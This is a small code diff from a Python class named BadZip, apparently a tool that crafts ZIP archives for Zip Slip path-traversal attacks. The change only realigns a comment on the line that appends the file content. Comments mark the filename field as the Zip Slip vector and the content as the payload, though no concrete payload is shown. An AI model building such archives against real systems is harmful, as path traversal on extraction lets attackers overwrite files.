@@ -66,7 +66,7 @@ class BadZip:
             self.hex_lfh_fname_len,      # Filename length
             b'\x00\x00',                 # Extra field length
             self.lfh_fname.encode(),     # File name (**Zip Slip**)
-            self.fcontent       # File content (**Payload**)
+            self.fcontent                # File content (**Payload**)
         ]
         return b''.join(local_file_header)
 
